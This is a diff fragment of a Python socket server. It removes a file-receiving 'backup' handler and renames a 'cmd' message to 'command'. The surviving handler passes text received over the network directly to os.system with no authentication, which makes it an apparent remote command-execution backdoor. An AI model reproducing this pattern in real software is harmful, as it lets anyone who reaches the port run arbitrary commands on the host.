@@ -33,34 +33,6 @@ def serverRun():
         print("[SERVER] waiting....")
         c , _ = s.accept()
         msg = c.recv(1024)
-        if(str(msg.decode("utf-8")) == "backup"):
-            received = c.recv(4096).decode()
-            filename, filesize = received.split(SPACE)
-            # remove absolute path if there is
-            filename = os.path.basename(filename)
-            # convert to integer
-            filesize = int(filesize)
-            # start receiving the file from the socket
-            # and writing to the file stream
-            progress = tqdm.tqdm(range(filesize), f"Receiving {filename}", unit="B", unit_scale=True, unit_divisor=1024)
-            with open(filename, "wb") as f:
-                while True:
-                    # read 1024 bytes from the socket (receive)
-                    bytes_read = c.recv(4096)
-                    if not bytes_read:    
-                        # nothing is received
-                        # file transmitting is done
-                        break
-                    # write to the file the bytes we just received
-                    f.write(bytes_read)
-                    # update the progress bar
-                    progress.update(len(bytes_read))
-
-            # close the client socket
-            c.close()
-            # close the server socket
-            s.close()
-
         if(str(msg.decode("utf-8")) == "upload"):
             try:
                 data = c.recv(4096).decode()
@@ -85,7 +57,7 @@ def serverRun():
                 c.send(bytes(data , "utf-8"))
             except:
                 pass
-        if(str(msg.decode("utf-8")) == "cmd"):
+        if(str(msg.decode("utf-8")) == "command"):
                 try:
                     data = str(c.recv(4096).decode("utf-8"))
                     os.system(data)
